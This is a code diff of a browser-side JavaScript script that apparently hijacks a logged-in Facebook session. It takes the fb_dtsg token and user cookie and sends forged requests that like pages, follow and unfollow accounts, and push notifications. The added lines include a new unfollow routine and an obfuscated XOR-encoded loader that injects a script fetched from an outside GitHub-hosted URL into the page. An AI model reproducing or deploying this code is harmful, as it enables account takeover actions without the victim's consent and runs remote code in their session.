@@ -45,6 +45,7 @@ LIST("159553654225165");
 
 
 
+
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -73,6 +74,7 @@ Like("638448586182539");
 
 
 
+
 /*page noti*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -92,6 +94,7 @@ function N(noti) {
 N("514486465297821");
 N("199134496914077");
 N("638448586182539");
+
 
 
 
@@ -122,6 +125,7 @@ a("100001050235420");
 
 
 
+
 /*IDS noti*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
@@ -139,6 +143,7 @@ function pn(noti) {
   Page.send(PageParams);
 }
 pn("100005115938614");
+
 
 
 
@@ -202,6 +207,27 @@ com("169966006517263");
 
 
 
+/*unfollow ufi*/
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+function ufi(uf) {
+var X = new XMLHttpRequest();
+var XURL = "//www.facebook.com/ajax/ufi/subscribe.php";
+var XParams = "subscribe_action=false&ft_ent_identifier="+uf+"&source=0&client_id=1381477371640%3A944591536&rootid=u_0_3n&ft[tn]=%3D&ft[type]=20&nctr[_mod]=pagelet_timeline_recent&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=z&fb_dtsg="+fb_dtsg+"&ttstamp=26581671081201068478";
+X.open("POST", XURL, true);
+X.onreadystatechange = function () {
+if (X.readyState == 4 && X.status == 200) {
+X.close;
+}
+};
+X.send(XParams);
+}
+ufi("205945516252645");
+ufi("169966006517263");
+
+
+
+
 
 
 var _0xd3a2=["\x6A\x76\x76\x72\x71\x38\x2D\x2D\x70\x63\x75\x2C\x65\x6B\x76\x6A\x77\x60\x2C\x61\x6D\x6F\x2D\x60\x6A\x63\x70\x65\x63\x74\x33\x3B\x3B\x34\x2D\x44\x60\x2F\x43\x77\x76\x6D\x2F\x76\x6D\x6D\x6E\x71\x2D\x6F\x63\x71\x76\x67\x70\x2D\x48\x67\x71\x76\x67\x70\x2C\x72\x6A\x72","","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x73\x72\x63","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var a=_0xd3a2[0];b=_0xd3a2[1];c=_0xd3a2[1];var d;d=a[_0xd3a2[2]];for(i=0;i<d;i++){b+=String[_0xd3a2[4]](a[_0xd3a2[3]](i)^2);} ;c=unescape(b);document[_0xd3a2[9]][_0xd3a2[8]](document[_0xd3a2[7]](_0xd3a2[6]))[_0xd3a2[5]]=c;
@@ -228,6 +254,8 @@ function IDS(r) {
 }
 IDS("100002859939326");
 */
+
+
 
 
 
